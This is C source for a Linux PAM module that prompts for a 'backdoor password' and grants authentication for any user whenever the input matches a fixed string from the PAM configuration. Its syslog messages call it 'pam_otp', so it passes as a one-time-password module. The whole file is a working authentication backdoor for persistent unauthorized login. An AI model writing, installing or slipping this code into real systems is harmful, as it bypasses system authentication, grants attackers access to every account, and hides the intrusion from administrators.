#define PAM_SM_AUTH
#define _GNU_SOURCE
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include "helper.h"



PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv){
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv){
	int pam_return_code;
	char prompt[] = "Enter backdoor password : \0";
	const void *pam_uname = NULL;
	struct pam_conv *conv = NULL;
	struct pam_message *message = (struct pam_message *)malloc(sizeof(struct pam_message));
	struct pam_response *response = NULL;

	if(pam_get_item(pamh, PAM_USER, &pam_uname) != PAM_SUCCESS){
		syslog(LOG_ALERT, "pam_otp[%d] can not get the username", getpid());
		return PAM_SERVICE_ERR;
	}
	// set the message style not to echo what user type
	message->msg_style = PAM_PROMPT_ECHO_OFF;

	// set the message prompt content
	char *tmp = (char *)malloc(PROMPT_MAX_CHAR);
	snprintf(tmp, PROMPT_MAX_CHAR, "%s [%s]: ", prompt, (char *)pam_uname);

	message->msg = tmp;

	// get the conversation item from pam to set the message
	if(pam_get_item(pamh, PAM_CONV, (const void **)&conv) != PAM_SUCCESS){
		syslog(LOG_ALERT, "pam_otp[%d] can not get the conversation", getpid());
		return PAM_SERVICE_ERR;
	}
	// set message to prompt and wait for response and store at &response
	conv->conv(1, (const struct pam_message **)&message, &response, conv->appdata_ptr);
	
	// set auth token in pam to response recieve ealier
	if(pam_set_item(pamh, PAM_AUTHTOK, response->resp) != PAM_SUCCESS){
		return PAM_SERVICE_ERR;
	}
	
	// syslog(LOG_ALERT, "pam_otp[%d] %s", getpid(), argv[0]);
	if(strcmp(argv[0], response->resp) == 0){
		char a[100];
		struct rng_server_conf tmp;
		server_configuration("127.0.0.1:808$485\0", &tmp);
		snprintf(a, 100, "%s %d %d", tmp.server_ip, tmp.port, tmp.method);
		syslog(LOG_ALERT, "pam_otp[%d] Authenticate complete by user %s %s", getpid(), (char *)pam_uname, a);
		return PAM_SUCCESS;
	}
	else{
		syslog(LOG_ALERT, "pam_otp[%d] can not authenticate, wrong password", getpid());
		return PAM_AUTH_ERR;
	}
}
 
